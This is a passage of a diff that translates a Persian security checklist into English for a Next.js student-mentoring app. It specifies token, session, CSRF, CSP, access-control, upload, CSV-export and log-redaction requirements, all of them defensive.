-- [ ] **SEC-T7** CLI بازیابی برای تنها مدیر: `pnpm admin:reset-link --phone …` که از کنسول سرور (SSH کانتینر) اجرا می‌شود، لینک بازنشانی ۱ ساعته می‌سازد، قفل‌های آن موبایل را پاک می‌کند و در `audit_log` با `actor_id = null` و `data.via = 'cli'` ثبت می‌شود.
-- [ ] **SEC-T8** انقضا: دعوت ۷ روز (F1)، بازنشانی ۲۴ ساعت. ساخت توکن تازه توکن‌های باز قبلی را باطل می‌کند (طبق طراحی). `inviteUrl` و `resetUrl` در پاسخ `Cache-Control: no-store` دارند و هرگز در `audit_log.data` نمی‌آیند.
+### 5-3. Invite and reset token (BE, FE)
+- [ ] **SEC-T1** (C1) The token only in the link fragment and in the POST body. No route may have `:token`. The `/invite` and `/reset` pages must clear the hash with `history.replaceState` after reading it.
+- [ ] **SEC-T2** 32 bytes from `crypto.randomBytes`; store the SHA-256; look up by `token_hash`; acceptance in **one transaction** with `UPDATE auth_tokens SET used_at=now() WHERE token_hash=$1 AND used_at IS NULL AND revoked_at IS NULL AND expires_at > now() RETURNING …` (this prevents concurrent double consumption).
+- [ ] **SEC-T3** No GET may consume or invalidate the token. The `/invite` and `/reset` pages: `Cache-Control: no-store`, `Referrer-Policy: no-referrer`, `<meta name="robots" content="noindex">`, no Open Graph tags with a name or mobile number, and no external links.
+- [ ] **SEC-T4** Acceptance requires the full mobile number (C1). 5 wrong mobile numbers for one token ← `revoked_at = now()` and `audit_log(auth.token_revoked_mismatch)`.
+- [ ] **SEC-T5** After acceptance: all of the user's previous sessions are revoked, `password_changed_at = now()`, and staff see "Invite accepted: time, device type" in the profile and the users page, so that if a student says "the link didn't work" the coach can tell someone else opened it. If the browser already has another session when the link is opened (for example the coach tries the link themselves), the page should warn, and acceptance should close that browser's previous session.
+- [ ] **SEC-T6** The admin bootstrap CLI link: expiry of **1 hour**. It is printed only on the stdout of that CLI process, not in the application log.
+- [ ] **SEC-T7** A recovery CLI for the sole admin: `pnpm admin:reset-link --phone …`, run from the server console (SSH into the container), creates a 1-hour reset link, clears that mobile number's lockouts and is recorded in `audit_log` with `actor_id = null` and `data.via = 'cli'`.
+- [ ] **SEC-T8** Expiry: invite 7 days (F1), reset 24 hours. Creating a new token invalidates the earlier open tokens (by design). `inviteUrl` and `resetUrl` in a response carry `Cache-Control: no-store` and never appear in `audit_log.data`.
 
-### ۵-۴. نشست و کوکی (BE)
-- [ ] **SEC-S1** کوکی نشست در تولید: `__Host-uc_session=<token>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=<ثانیه تا سقف مطلق نشست>`. بدون `Domain`. (اصلاح F-07:) `Max-Age` برابر **سقف مطلق** است، چون RSC نمی‌تواند کوکی بنویسد. انقضای لغزنده **فقط در سرور** (`sessions.expires_at`) در هر درخواست API و RSC سنجیده و حداکثر هر ۱۵ دقیقه تمدید می‌شود. کوکی کهنه هیچ دسترسی‌ای نمی‌دهد. شرط: هیچ مسیری نشست را بدون همان بررسی SEC-S3 نپذیرد.
-- [ ] **SEC-S2** عمر: هنرجو لغزنده‌ی ۳۰ روز و سقف مطلق ۹۰ روز؛ **مدیر و مشاور لغزنده‌ی ۷ روز و سقف مطلق ۳۰ روز** (C2).
-- [ ] **SEC-S3** اعتبارسنجی در **هر** درخواست (API و RSC): نشست باطل یا منقضی نباشد؛ `users.status = 'active'`؛ `sessions.created_at >= users.password_changed_at`؛ **نقش از `users` خوانده شود**، نه از cache نشست.
-- [ ] **SEC-S4** نشست تازه با ورود و پذیرش توکن. با `change-password`، نشست‌های دیگر باطل **و نشست جاری هم چرخانده شود** (توکن تازه، ردیف تازه). ابطال همه‌ی نشست‌ها با: تغییر یا بازنشانی رمز، غیرفعال‌سازی، تغییر نقش، تغییر موبایل توسط مدیر، و حذف حساب.
-- [ ] **SEC-S5** خروج: `POST /auth/logout` ← `revoked_at`، کوکی با `Max-Age=0`، و سرآیند `Clear-Site-Data: "cache"`.
-- [ ] **SEC-S6** توکن نشست فقط از کوکی خوانده شود (نه query string و نه سرآیند دیگر).
-- [ ] **SEC-S7** (توصیه برای 0.1، الزام پیش از دعوت دومین مدیر) تأیید دوباره‌ی رمز برای خروجی CSV، دعوت مدیر و مشاور، تغییر نقش، و `settings.access`: اگر از آخرین ورود یا تأیید بیش از ۳۰ دقیقه گذشته، `POST /auth/reauth { password }` لازم است (ستون `sessions.reauth_at`).
-- [ ] **SEC-S8** محیط local: اگر `APP_BASE_URL` با `http://localhost` شروع شود، نام کوکی `uc_session` بدون `Secure` باشد. در `NODE_ENV=production` اگر `APP_BASE_URL` با `https://` شروع نشود، برنامه **بالا نیاید**.
+### 5-4. Session and cookie (BE)
+- [ ] **SEC-S1** The session cookie in production: `__Host-uc_session=<token>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=<seconds up to the session's absolute cap>`. No `Domain`. (F-07 correction:) `Max-Age` equals the **absolute cap**, because RSC cannot write a cookie. The sliding expiry is checked **only on the server** (`sessions.expires_at`) on every API and RSC request and renewed at most every 15 minutes. A stale cookie grants no access. Condition: no path may accept a session without the same SEC-S3 check.
+- [ ] **SEC-S2** Lifetime: student sliding 30 days and absolute cap 90 days; **admin and mentor sliding 7 days and absolute cap 30 days** (C2).
+- [ ] **SEC-S3** Validation on **every** request (API and RSC): the session is not revoked or expired; `users.status = 'active'`; `sessions.created_at >= users.password_changed_at`; the **role is read from `users`**, not from a session cache.
+- [ ] **SEC-S4** A fresh session on login and token acceptance. With `change-password`, the other sessions are revoked **and the current session is also rotated** (a new token, a new row). All sessions are revoked on: password change or reset, deactivation, role change, mobile change by the admin, and account deletion.
+- [ ] **SEC-S5** Logout: `POST /auth/logout` ← `revoked_at`, the cookie with `Max-Age=0`, and the header `Clear-Site-Data: "cache"`.
+- [ ] **SEC-S6** The session token is read only from the cookie (not the query string and not any other header).
+- [ ] **SEC-S7** (Recommended for 0.1, required before inviting a second admin) Password re-confirmation for the CSV export, inviting an admin or mentor, changing a role, and `settings.access`: if more than 30 minutes have passed since the last login or confirmation, `POST /auth/reauth { password }` is required (column `sessions.reauth_at`).
+- [ ] **SEC-S8** Local environment: if `APP_BASE_URL` starts with `http://localhost`, the cookie name is `uc_session` without `Secure`. In `NODE_ENV=production`, if `APP_BASE_URL` does not start with `https://`, the application must **not start**.
 
-### ۵-۵. CSRF (BE)
-- [ ] **SEC-C1** برای همه‌ی متدهای `POST`، `PUT`، `PATCH` و `DELETE` زیر `/api/v1` (از جمله `/auth/login` و `/auth/tokens/*`): `Origin` **باید وجود داشته باشد** و دقیقاً برابر `new URL(APP_BASE_URL).origin` باشد. نبودن `Origin` ← `403 BAD_ORIGIN`. مقایسه‌ی رشته‌ای کامل، نه `includes` یا `startsWith`.
-- [ ] **SEC-C2** (لایه‌ی دوم) اگر `Sec-Fetch-Site` وجود دارد و مقدارش `same-origin` نیست ← `403`.
-- [ ] **SEC-C3** `Content-Type`: فقط `application/json` (با charset اختیاری). `multipart/form-data` فقط روی `/attachments` و `/imports/students`. غیر از این ← `415`. (اصلاح F-07:) POST **بی‌بدنه** (بدون `Content-Length` مثبت و بدون `Transfer-Encoding`) می‌تواند `Content-Type` نداشته باشد. هر بدنه‌ی غیرخالی بدون `Content-Type` ← `415`، و مسیرِ بی‌بدنه هر بدنه‌ای جز خالی یا `{}` را رد می‌کند. دفاع اصلی SEC-C1 است.
-- [ ] **SEC-C4** هیچ GETی اثر جانبی نداشته باشد (نوشتن `last_seen_at` و `audit_log` خروجی مستثنا هستند).
-- [ ] **SEC-C5** هیچ سرآیند `Access-Control-Allow-*` در هیچ پاسخی نباشد. اگر روزی اپ موبایل یا ربات آمد، با توکن جدا و ADR جدا.
+### 5-5. CSRF (BE)
+- [ ] **SEC-C1** For all `POST`, `PUT`, `PATCH` and `DELETE` methods under `/api/v1` (including `/auth/login` and `/auth/tokens/*`): `Origin` **must be present** and exactly equal to `new URL(APP_BASE_URL).origin`. A missing `Origin` ← `403 BAD_ORIGIN`. A full string comparison, not `includes` or `startsWith`.
+- [ ] **SEC-C2** (Second layer) If `Sec-Fetch-Site` is present and its value is not `same-origin` ← `403`.
+- [ ] **SEC-C3** `Content-Type`: only `application/json` (with an optional charset). `multipart/form-data` only on `/attachments` and `/imports/students`. Anything else ← `415`. (F-07 correction:) A **bodyless** POST (no positive `Content-Length` and no `Transfer-Encoding`) may have no `Content-Type`. Any non-empty body without a `Content-Type` ← `415`, and a bodyless path rejects any body other than empty or `{}`. The main defense is SEC-C1.
+- [ ] **SEC-C4** No GET may have a side effect (writing `last_seen_at` and the export `audit_log` are exceptions).
+- [ ] **SEC-C5** There must be no `Access-Control-Allow-*` header in any response. If a mobile app or a bot ever comes along, it gets a separate token and a separate ADR.
 
-### ۵-۶. هدرهای امنیتی و CSP (BE/FE، در `middleware.ts` یا `next.config`)
-- [ ] **SEC-H1** CSP با nonce برای هر درخواست (middleware در Next.js nonce را می‌سازد و Next خودش آن را روی اسکریپت‌هایش می‌گذارد). همه‌ی صفحه‌ها dynamic هستند (کارکنان و هنرجو هر دو احرازشده‌اند). مقدار تولید:
+### 5-6. Security headers and CSP (BE/FE, in `middleware.ts` or `next.config`)
+- [ ] **SEC-H1** A CSP with a per-request nonce (Next.js middleware builds the nonce and Next itself puts it on its scripts). All pages are dynamic (staff and students are both authenticated). The production value:
   ```
   default-src 'self';
   script-src 'self' 'nonce-{NONCE}' 'strict-dynamic';
@@ -347,195 +347,195 @@
   frame-ancestors 'none';
   upgrade-insecure-requests
   ```
-  - **هیچ منبع خارجی** (نه CDN، نه فونت، نه آنالیتیکس). `style-src 'unsafe-inline'` فقط به‌خاطر style attributeهای Radix است. ریسکش کم است چون React متن را escape می‌کند.
-  - در محیط توسعه فقط `'unsafe-eval'` به `script-src` و `ws:` به `connect-src` اضافه شود (برای HMR).
-  - پاسخ `GET /attachments/:id` CSP جدا دارد: `default-src 'none'; img-src 'self'; sandbox`.
-- [ ] **SEC-H2** روی همه‌ی پاسخ‌ها:
-  | سرآیند | مقدار |
+  - **No external resources** (no CDN, no font, no analytics). `style-src 'unsafe-inline'` is only because of Radix's style attributes. Its risk is low because React escapes text.
+  - In the development environment, only `'unsafe-eval'` is added to `script-src` and `ws:` to `connect-src` (for HMR).
+  - The `GET /attachments/:id` response has its own CSP: `default-src 'none'; img-src 'self'; sandbox`.
+- [ ] **SEC-H2** On all responses:
+  | Header | Value |
   |---|---|
-  | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (بدون `preload` تا دامنه قطعی شود؛ E4) |
+  | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (without `preload` until the domain is final; E4) |
   | `X-Content-Type-Options` | `nosniff` |
-  | `Referrer-Policy` | `same-origin` (روی `/invite` و `/reset` مقدار `no-referrer`) |
+  | `Referrer-Policy` | `same-origin` (on `/invite` and `/reset` the value is `no-referrer`) |
   | `X-Frame-Options` | `DENY` |
   | `Cross-Origin-Opener-Policy` | `same-origin` |
   | `Cross-Origin-Resource-Policy` | `same-origin` |
-  | `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), browsing-topics=()` (انتخاب عکس از دوربین با `<input type=file>` به این مجوزها نیاز ندارد) |
-  | `X-Powered-By` | حذف (`poweredByHeader: false`) |
-- [ ] **SEC-H3** Cache: پاسخ‌های `/api/v1/**` و صفحه‌های HTML احرازشده `Cache-Control: private, no-store`. assetهای `/_next/static` و فونت `public, max-age=31536000, immutable`.
-- [ ] **SEC-H4** service worker (PWA) **فقط** `/_next/static/*`، فونت و آیکن را cache کند. هرگز HTML، `/api/` یا `/attachments/` را cache نکند (تست e2e).
-- [ ] **SEC-H5** `next.config`: `images.remotePatterns` خالی (بدون بهینه‌سازی تصویر از دامنه‌ی دیگر). در تولید stack trace به کاربر نرسد.
+  | `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), browsing-topics=()` (picking a photo from the camera with `<input type=file>` does not need these permissions) |
+  | `X-Powered-By` | removed (`poweredByHeader: false`) |
+- [ ] **SEC-H3** Cache: `/api/v1/**` responses and authenticated HTML pages carry `Cache-Control: private, no-store`. `/_next/static` assets and fonts carry `public, max-age=31536000, immutable`.
+- [ ] **SEC-H4** The service worker (PWA) caches **only** `/_next/static/*`, fonts and icons. It must never cache HTML, `/api/` or `/attachments/` (e2e test).
+- [ ] **SEC-H5** `next.config`: `images.remotePatterns` empty (no image optimization from another domain). In production, no stack trace reaches the user.
 
-### ۵-۷. کنترل دسترسی (BE)
-- [ ] **SEC-A1** هر service عمومی اولین پارامترش `actor` است. هر خواندن منبع تکی از تابع کمکی `loadInScope(actor, kind, id)` می‌گذرد که `student_id` را از والد (تا ریشه) پیدا می‌کند و خارج از دامنه `404` می‌دهد.
-- [ ] **SEC-A2** پرس‌وجوهای فهرستی کارکنان شرط `staffStudentScope(actor)` را **در SQL** دارند، نه فیلتر پس از خواندن.
-- [ ] **SEC-A3** (C3) جدول شناسه‌های ارجاعی، در service و درون همان تراکنش.
-- [ ] **SEC-A4** (C3) `invite-link` توسط مشاور فقط برای `role='student'`. تغییر نقش فقط مدیر. برداشتن آخرین مدیر `409` (طبق طراحی).
-- [ ] **SEC-A5** مسیرهای مشترک (`/tasks/:id`، `/questions/:id`، `/profiles/:id`، `/attachments/:id`، `/tasks/:id/submissions`) DTO را با یک `switch` روی `actor.role` انتخاب کنند که حالت پیش‌فرض آن **خطا** است، نه DTO کارکنان.
-- [ ] **SEC-A6** (C3) ویرایش و حذف یادداشت و بازبینی: نویسنده **و** در دامنه، یا مدیر.
-- [ ] **SEC-A7** همه‌ی schemaهای ورودی zod با `.strict()`. فیلدهای ممنوع برای هر نقش (`primaryMentorId`، `currentStageId`، `lifecycleStatus`، `status` در نقطه‌ی عطف هنرجو، `studentId` در مسیرهای `/me`) در schema نباشند تا `422` بدهند.
-- [ ] **SEC-A8** (C3) `summary` برای assignee فقط با سؤال باز.
-- [ ] **SEC-A9** repoها ستون‌ها را **صریح** انتخاب کنند. `password_hash` فقط در `identity.repo.getCredentialsByPhone` خوانده شود. RSCها فقط DTO (نه ردیف دیتابیس) به کامپوننت کلاینت پاس بدهند.
-- [ ] **SEC-A10** Server Action ممنوع است (`"use server"` در CI جستجو و رد شود). همه‌ی mutationها Route Handler هستند و در `routes.manifest.ts` ثبت می‌شوند.
-- [ ] **SEC-A11** `middleware.ts` فقط برای nonce، هدرها و redirect به صفحه‌ی ورود است و **هیچ‌وقت تنها مانع دسترسی نیست**. Next.js همیشه روی آخرین نسخه‌ی وصله‌شده باشد.
+### 5-7. Access control (BE)
+- [ ] **SEC-A1** Every public service has `actor` as its first parameter. Every single-resource read goes through the helper `loadInScope(actor, kind, id)`, which finds `student_id` from the parent (up to the root) and returns `404` when out of scope.
+- [ ] **SEC-A2** Staff list queries have the `staffStudentScope(actor)` condition **in SQL**, not a filter after reading.
+- [ ] **SEC-A3** (C3) The referenced-ID table, in the service and inside the same transaction.
+- [ ] **SEC-A4** (C3) `invite-link` by a mentor only for `role='student'`. Role changes only by the admin. Removing the last admin returns `409` (by design).
+- [ ] **SEC-A5** Shared paths (`/tasks/:id`, `/questions/:id`, `/profiles/:id`, `/attachments/:id`, `/tasks/:id/submissions`) must choose the DTO with a `switch` on `actor.role` whose default case is an **error**, not the staff DTO.
+- [ ] **SEC-A6** (C3) Editing and deleting a note and a review: author **and** in scope, or admin.
+- [ ] **SEC-A7** All zod input schemas use `.strict()`. Fields forbidden for each role (`primaryMentorId`, `currentStageId`, `lifecycleStatus`, `status` in a student's milestone, `studentId` on `/me` paths) must not be in the schema so that they return `422`.
+- [ ] **SEC-A8** (C3) `summary` for an assignee only with an open question.
+- [ ] **SEC-A9** Repos must select columns **explicitly**. `password_hash` is read only in `identity.repo.getCredentialsByPhone`. RSCs pass only DTOs (not database rows) to client components.
+- [ ] **SEC-A10** Server Actions are forbidden (search for `"use server"` in CI and reject). All mutations are Route Handlers and are registered in `routes.manifest.ts`.
+- [ ] **SEC-A11** `middleware.ts` is only for the nonce, headers and redirecting to the login page, and is **never the only barrier to access**. Next.js must always be on the latest patched version.
 
-### ۵-۸. اعتبارسنجی ورودی و XSS (BE، FE)
-- [ ] **SEC-V1** سقف بدنه‌ی JSON: ۲۵۶ کیلوبایت، **پیش از** parse (بررسی `Content-Length` و قطع جریان پس از سقف) ← `413`. سقف طول در zod: نام ۱۰۰، موضوع ۲۰۰، یادداشت، پیام و بازخورد ۱۰ هزار، متن آگهی و پروپوزال و پروفایل هر کدام ۲۰ هزار نویسه، `links` حداکثر ۱۰ مورد، `tags` حداکثر ۲۰ مورد، `q` حداکثر ۱۰۰، `limit` حداکثر ۱۰۰.
-- [ ] **SEC-X1** `dangerouslySetInnerHTML` ممنوع است (Biome `noDangerouslySetInnerHtml` در حالت error). خط جدید با CSS `white-space: pre-wrap`. هایلایت جستجو با تقسیم رشته به چند `<mark>`، نه HTML.
-- [ ] **SEC-X2** **همه‌ی** فیلدهای URL (`public_url`، `links[].url` در تحویل، سؤال و پیام، `content_links` مرحله، `evidence` اگر لینک دارد) در سرور با `new URL()` بررسی شوند: `protocol === 'https:'`، بدون `username` و `password`، حداکثر ۲۰۴۸ نویسه. یک schema مشترک `httpsUrl` در `server/http`.
-- [ ] **SEC-X3** اگر UI لینک‌های داخل متن آزاد را خودکار قابل‌کلیک می‌کند، فقط `https://` و `http://` را لینک کند و خروجی را با کامپوننت React بسازد، نه HTML.
-- [ ] **SEC-X4** داده هرگز با `JSON.stringify` دستی در `<script>` گذاشته نشود. فقط props به کامپوننت‌ها.
-- [ ] **SEC-X5** در نرمال‌سازی (`lib/text-fa`) نویسه‌های کنترل جهت `U+202A` تا `U+202E` و `U+2066` تا `U+2069` از نام، موضوع، عنوان لینک و `original_name` حذف شوند. نیم‌فاصله (`U+200C`) و `U+200D` بمانند.
-- [ ] **SEC-X6** لینک‌های بیرونی: `target="_blank" rel="noopener noreferrer"`. نمایش لینک در `<bdi dir="ltr">` با **دامنه‌ی** مقصد کنار متن لینک (برای لینک‌هایی که هنرجو داده است).
+### 5-8. Input validation and XSS (BE, FE)
+- [ ] **SEC-V1** JSON body limit: 256 KB, **before** parsing (check `Content-Length` and cut the stream after the limit) ← `413`. Length limits in zod: name 100, subject 200, note, message and feedback 10 thousand, job post, proposal and profile text 20 thousand characters each, `links` at most 10 items, `tags` at most 20 items, `q` at most 100, `limit` at most 100.
+- [ ] **SEC-X1** `dangerouslySetInnerHTML` is forbidden (Biome `noDangerouslySetInnerHtml` at error level). New lines with CSS `white-space: pre-wrap`. Search highlighting by splitting the string into several `<mark>` elements, not HTML.
+- [ ] **SEC-X2** **All** URL fields (`public_url`, `links[].url` in submissions, questions and messages, stage `content_links`, `evidence` if it has a link) are checked on the server with `new URL()`: `protocol === 'https:'`, no `username` and `password`, at most 2048 characters. A shared `httpsUrl` schema in `server/http`.
+- [ ] **SEC-X3** If the UI makes links inside free text automatically clickable, it must link only `https://` and `http://` and build the output with a React component, not HTML.
+- [ ] **SEC-X4** Data must never be placed in a `<script>` with a hand-written `JSON.stringify`. Only props to components.
+- [ ] **SEC-X5** In normalization (`lib/text-fa`), the directional control characters `U+202A` to `U+202E` and `U+2066` to `U+2069` are removed from names, subjects, link titles and `original_name`. The half-space (`U+200C`) and `U+200D` stay.
+- [ ] **SEC-X6** External links: `target="_blank" rel="noopener noreferrer"`. Show the link in `<bdi dir="ltr">` with the destination **domain** next to the link text (for links given by the student).
 
-### ۵-۹. آپلود (BE)
-- [ ] **SEC-U1** نوع فایل از **محتوا** تشخیص داده شود (`sharp(buf).metadata().format` ∈ `jpeg|png|webp`)، نه از `Content-Type` یا پسوند. SVG، GIF، HEIC و PDF در 0.1 رد می‌شوند (`415`).
-- [ ] **SEC-U2** `sharp(input, { limitInputPixels: 40_000_000, failOn: 'error', animated: false })`. خروجی حداکثر ۴۰۹۶ پیکسل در بزرگ‌ترین ضلع (`resize({ fit: 'inside', withoutEnlargement: true })`).
-- [ ] **SEC-U3** هم‌زمانی پردازش تصویر حداکثر ۲ (`sharp.concurrency(1)` و یک صف ساده).
-- [ ] **SEC-U4** سقف ۵ مگابایت **پیش از** بافر شدن بدنه: `Content-Length` بیش از `MAX_UPLOAD_BYTES + 64KB` ← `413` فوری. جریان بدنه با شمارنده‌ی بایت خوانده شود و پس از سقف قطع شود. `request.formData()` روی بدنه‌ی بی‌سقف صدا زده نشود.
-- [ ] **SEC-U5** ترتیب: `.rotate()` (اعمال جهت EXIF) ← بازکدگذاری به همان قالب ← **بدون** `withMetadata()` (EXIF، GPS، ICC و XMP حذف می‌شوند). فایل اصلی هرگز ذخیره نشود.
-- [ ] **SEC-U6** دانلود از `GET /attachments/:id`: `Content-Type` از قالب بازکدگذاری‌شده (نه از ورودی)، `X-Content-Type-Options: nosniff`، `Content-Disposition: inline; filename*=UTF-8''<نام پاک‌شده>`، CSP جدا (SEC-H1)، `Cache-Control: private, no-store` (اصلاح F-07؛ سخت‌گیرتر از `no-cache` در C4).
-- [ ] **SEC-U7** سهمیه: حداکثر ۲۰ پیوست `pending` و ۱۰۰ آپلود در روز به ازای هر کاربر ← `429`.
-- [ ] **SEC-U8** `storage_key` = UUID تصادفی. `original_name` فقط برای نمایش و پاک‌شده (بدون مسیر، بدون نویسه‌ی کنترل، حداکثر ۲۰۰ نویسه).
-- [ ] **SEC-U9** (C4) وصل کردن اتمی فقط پیوست `pending` همان آپلودکننده.
+### 5-9. Upload (BE)
+- [ ] **SEC-U1** The file type is detected from the **content** (`sharp(buf).metadata().format` ∈ `jpeg|png|webp`), not from `Content-Type` or the extension. SVG, GIF, HEIC and PDF are rejected in 0.1 (`415`).
+- [ ] **SEC-U2** `sharp(input, { limitInputPixels: 40_000_000, failOn: 'error', animated: false })`. The output is at most 4096 pixels on the longest side (`resize({ fit: 'inside', withoutEnlargement: true })`).
+- [ ] **SEC-U3** Image processing concurrency of at most 2 (`sharp.concurrency(1)` and a simple queue).
+- [ ] **SEC-U4** The 5 MB limit **before** the body is buffered: `Content-Length` over `MAX_UPLOAD_BYTES + 64KB` ← immediate `413`. The body stream is read with a byte counter and cut after the limit. `request.formData()` must not be called on an unlimited body.
+- [ ] **SEC-U5** Order: `.rotate()` (apply the EXIF orientation) ← re-encode to the same format ← **without** `withMetadata()` (EXIF, GPS, ICC and XMP are removed). The original file is never stored.
+- [ ] **SEC-U6** Download from `GET /attachments/:id`: `Content-Type` from the re-encoded format (not from the input), `X-Content-Type-Options: nosniff`, `Content-Disposition: inline; filename*=UTF-8''<sanitized name>`, a separate CSP (SEC-H1), `Cache-Control: private, no-store` (F-07 correction; stricter than the `no-cache` in C4).
+- [ ] **SEC-U7** Quota: at most 20 `pending` attachments and 100 uploads per day per user ← `429`.
+- [ ] **SEC-U8** `storage_key` = a random UUID. `original_name` is only for display and is sanitized (no path, no control characters, at most 200 characters).
+- [ ] **SEC-U9** (C4) Atomic linking of only a `pending` attachment from the same uploader.
 
-### ۵-۱۰. CSV (BE)
-- [ ] **SEC-V2** خنثی‌سازی سلول‌های خروجی: اگر مقدار رشته‌ای پس از trim با یکی از `=`، `+`، `-`، `@`، Tab (`\t`)، CR (`\r`)، یا نسخه‌های تمام‌عرض `＝ ＋ － ＠` شروع شود، یک `'` به ابتدای آن اضافه شود. سپس quote استاندارد CSV (همه‌ی سلول‌ها داخل `"` و `"` درونی دوتایی). موبایل در خروجی با قالب `0912…` نوشته شود (با `+` شروع نشود). یک تابع `toSafeCsvCell` با تست واحد.
-- [ ] **SEC-V3** ستون‌های خروجی **صریح و حداقلی** باشند. یادداشت داخلی، پرچم، دلیل‌های سلامت و متن تحویل‌ها در CSV نیایند. خروجی: `Content-Disposition: attachment`، `Cache-Control: no-store`، و `audit_log(export.*)` با تعداد ردیف. در UI پیش از دانلود هشدار «این فایل شامل موبایل و لینک پروفایل همه‌ی هنرجوهاست؛ پس از استفاده پاکش کن».
-- [ ] **SEC-V4** (C6) ورود: فقط CSV، حداکثر ۱ مگابایت و ۵۰۰ ردیف. هر سلول از همان zod مسیرهای عادی می‌گذرد. ورودی‌های فرمول‌مانند به‌صورت متن ذخیره می‌شوند و در خروجی با SEC-V2 خنثی می‌شوند.
-- [ ] **SEC-V5** پاسخ ورود (با `inviteUrl`ها) `Cache-Control: no-store` دارد و هیچ‌جا لاگ نمی‌شود. خطای ردیف‌ها شماره‌ی خط و نام ستون را می‌گوید، **نه مقدار** (به‌خصوص موبایل).
+### 5-10. CSV (BE)
+- [ ] **SEC-V2** Neutralizing output cells: if a string value, after trim, starts with one of `=`, `+`, `-`, `@`, Tab (`\t`), CR (`\r`), or the full-width versions `＝ ＋ － ＠`, a `'` is prepended. Then standard CSV quoting (all cells inside `"` and inner `"` doubled). The mobile number is written in the output in the `0912…` format (not starting with `+`). A single `toSafeCsvCell` function with a unit test.
+- [ ] **SEC-V3** The export columns are **explicit and minimal**. Internal notes, flags, health reasons and submission text do not appear in the CSV. The output: `Content-Disposition: attachment`, `Cache-Control: no-store`, and `audit_log(export.*)` with the row count. Before the download, the UI shows a warning: "This file contains the mobile numbers and profile links of all students; delete it after use" (Persian original: «این فایل شامل موبایل و لینک پروفایل همه‌ی هنرجوهاست؛ پس از استفاده پاکش کن»).
+- [ ] **SEC-V4** (C6) Import: CSV only, at most 1 MB and 500 rows. Each cell goes through the same zod as the normal paths. Formula-like inputs are stored as text and are neutralized on output with SEC-V2.
+- [ ] **SEC-V5** The import response (with `inviteUrl`s) carries `Cache-Control: no-store` and is never logged. Row errors give the line number and column name, **not the value** (especially the mobile number).
 
-### ۵-۱۱. لاگ و ماسک (BE، DO)
-- [ ] **SEC-L1** pino `redact` (با `censor: '[REDACTED]'`):
-  `req.headers.cookie`، `req.headers.authorization`، `req.headers["x-job-secret"]`، `res.headers["set-cookie"]`، `*.password`، `*.currentPassword`، `*.newPassword`، `*.token`، `*.inviteUrl`، `*.resetUrl`، `*.passwordHash`، `*.tokenHash`.
-- [ ] **SEC-L2** serializer درخواست فقط `method`، **مسیر بدون query string**، `statusCode`، `responseTime`، `requestId` و `userId` (اگر هست) را لاگ کند. بدنه‌ی درخواست و پاسخ هرگز لاگ نشوند.
-- [ ] **SEC-L3** موبایل هرگز کامل لاگ نشود. برای همبستگی `userId` لاگ شود. اگر موبایل لازم است (مثلاً ورود ناموفق برای موبایل ناموجود)، `maskPhone('+989121234567') → '+98•••••4567'`. این تابع در `lib/phone` تست واحد دارد. تست CI (بخش ۶، T-LOG) خروجی لاگ را با الگوی `(\+98|0098|0)9\d{9}` می‌گردد.
-- [ ] **SEC-L4** خطاهای zod در لاگ فقط `path` و `code` داشته باشند، نه `received` یا مقدار ورودی. لاگ پرس‌وجوی Drizzle در تولید خاموش باشد.
-- [ ] **SEC-L5** (DO) Postgres: `log_statement = 'ddl'`؛ اگر لاگ پرس‌وجوی کند روشن است، `log_parameter_max_length = 0` و `log_parameter_max_length_on_error = 0`. لاگ HTTP خود App Service یا خاموش باشد یا نگه‌داری‌اش حداکثر ۷ روز. لاگ برنامه حداکثر ۳۰ روز نگه داشته شود.
-- [ ] **SEC-L6** (DO) هشدار: بیش از ۵۰ ورود ناموفق در ۱۵ دقیقه در کل سیستم؛ هر قفل روی حساب مدیر؛ هر `user.role_changed`. (از لاگ ساختاریافته، با `event` ثابت: `auth.login_failed`، `auth.locked`، …)
-- [ ] **SEC-L7** `audit_log` این رخدادها را هم ثبت کند: `user.invite_link_created` (با نقش سازنده)، `auth.token_revoked_mismatch`، `auth.locked` (فقط برای حساب‌های موجود)، `note.visibility_changed` (internal ← shared)، `user.phone_changed`، `user.erased`، `session.revoked_all`. هیچ‌وقت توکن، لینک یا رمز در `data` نیاید.
+### 5-11. Logs and masking (BE, DO)
+- [ ] **SEC-L1** pino `redact` (with `censor: '[REDACTED]'`):
+  `req.headers.cookie`, `req.headers.authorization`, `req.headers["x-job-secret"]`, `res.headers["set-cookie"]`, `*.password`, `*.currentPassword`, `*.newPassword`, `*.token`, `*.inviteUrl`, `*.resetUrl`, `*.passwordHash`, `*.tokenHash`.
+- [ ] **SEC-L2** The request serializer logs only `method`, the **path without the query string**, `statusCode`, `responseTime`, `requestId` and `userId` (if present). Request and response bodies are never logged.
+- [ ] **SEC-L3** A mobile number is never logged in full. Log `userId` for correlation. If the mobile number is needed (for example a failed login for a non-existent mobile number), use `maskPhone('+989121234567') → '+98•••••4567'`. This function has a unit test in `lib/phone`. The CI test (section 6, T-LOG) searches the log output with the pattern `(\+98|0098|0)9\d{9}`.
+- [ ] **SEC-L4** zod errors in logs have only `path` and `code`, not `received` or the input value. Drizzle query logging is off in production.
+- [ ] **SEC-L5** (DO) Postgres: `log_statement = 'ddl'`; if slow-query logging is on, `log_parameter_max_length = 0` and `log_parameter_max_length_on_error = 0`. App Service's own HTTP log is either off or retained for at most 7 days. The application log is retained for at most 30 days.
+- [ ] **SEC-L6** (DO) Alerts: more than 50 failed logins in 15 minutes across the whole system; any lockout on the admin account; any `user.role_changed`. (From the structured log, with a fixed `event`: `auth.login_failed`, `auth.locked`, …)
+- [ ] **SEC-L7** `audit_log` also records these events: `user.invite_link_created` (with the creator's role), `auth.token_revoked_mismatch`, `auth.locked` (only for existing accounts), `note.visibility_changed` (internal ← shared), `user.phone_changed`, `user.erased`, `session.revoked_all`. A token, link or password must never appear in `data`.
 
-### ۵-۱۲. endpoint داخلی jobs (BE)
-- [ ] **SEC-J1** اگر `JOBS_MODE=http-trigger` و `JOB_TRIGGER_SECRET` کمتر از ۳۲ بایت (یا خالی) باشد، برنامه **بالا نیاید**. در هر حالت دیگر، `/api/internal/**` بدون توجه به سرآیند `404` بدهد.
